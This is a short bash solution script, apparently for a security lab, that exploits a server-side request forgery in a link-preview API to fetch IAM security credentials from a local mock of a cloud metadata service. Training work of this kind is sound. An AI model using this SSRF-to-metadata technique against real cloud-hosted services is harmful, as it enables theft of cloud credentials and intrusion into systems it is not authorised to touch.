#!/usr/bin/env bash
# Lab 25 — the fetch happens from inside, so ask it for something inside.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9250}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab25
META="http://127.0.0.1:9251"

"$H5I" browser open "$URL/api/preview?url=http://127.0.0.1:9251/" \
    --session "$SESSION" --new --capture --allow 127.0.0.1 >/dev/null

# Walk the tree the way you would on a real instance.
send "$SESSION" req_0 --set "query.url=$META/latest/meta-data/iam/security-credentials/" | body >&2; echo >&2
send "$SESSION" req_0 --set "query.url=$META/latest/meta-data/iam/security-credentials/linkpreview-role" | flag
